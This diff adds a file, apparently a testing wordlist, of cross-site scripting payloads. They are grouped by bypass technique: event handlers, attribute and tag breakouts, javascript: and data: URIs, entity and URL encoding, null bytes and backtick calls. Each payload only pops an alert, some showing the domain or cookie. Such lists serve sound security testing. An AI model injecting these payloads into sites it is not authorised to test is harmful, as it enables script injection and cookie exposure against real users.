@@ -1,0 +1,84 @@
+# XSS (Cross-Site Scripting) Payloads
+# Various payloads for testing reflected and stored XSS
+
+# Basic script injection
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+
+# Case variations
+<ScRiPt>alert('XSS')</ScRiPt>
+<SCRIPT>alert('XSS')</SCRIPT>
+<scRIPT>alert('XSS')</scRIPT>
+
+# Event handlers - img tag
+<img src=x onerror=alert('XSS')>
+<img src=x onerror="alert('XSS')">
+<img src="x" onerror="alert('XSS')">
+<img/src=x onerror=alert('XSS')>
+<img src=x:alert(alt) onerror=eval(src) alt=XSS>
+
+# Event handlers - svg tag
+<svg onload=alert('XSS')>
+<svg/onload=alert('XSS')>
+<svg onload="alert('XSS')">
+
+# Event handlers - body tag
+<body onload=alert('XSS')>
+<body onpageshow=alert('XSS')>
+
+# Event handlers - input tag
+<input onfocus=alert('XSS') autofocus>
+<input onblur=alert('XSS') autofocus><input autofocus>
+<input type="text" onfocus="alert('XSS')" autofocus>
+
+# Event handlers - other tags
+<marquee onstart=alert('XSS')>
+<video><source onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<iframe onload=alert('XSS')>
+<object data="javascript:alert('XSS')">
+
+# Breaking out of attributes
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
+" onmouseover="alert('XSS')"
+' onmouseover='alert(1)'
+" onfocus="alert('XSS')" autofocus="
+
+# Breaking out of tags
+</title><script>alert('XSS')</script>
+</textarea><script>alert('XSS')</script>
+</style><script>alert('XSS')</script>
+</script><script>alert('XSS')</script>
+
+# JavaScript protocol
+javascript:alert('XSS')
+javascript:alert(1)//
+java%0ascript:alert('XSS')
+
+# Data URI
+data:text/html,<script>alert('XSS')</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+
+# HTML entities
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+# URL encoded
+%3Cscript%3Ealert('XSS')%3C/script%3E
+%3Csvg%20onload%3Dalert('XSS')%3E
+
+# Double encoding
+%253Cscript%253Ealert('XSS')%253C/script%253E
+
+# Null byte injection
+<script>alert('XSS')</script>\x00
+<img src=x onerror=alert('XSS')\x00>
+
+# No quotes/parentheses
+<script>alert`XSS`</script>
+<img src=x onerror=alert`XSS`>
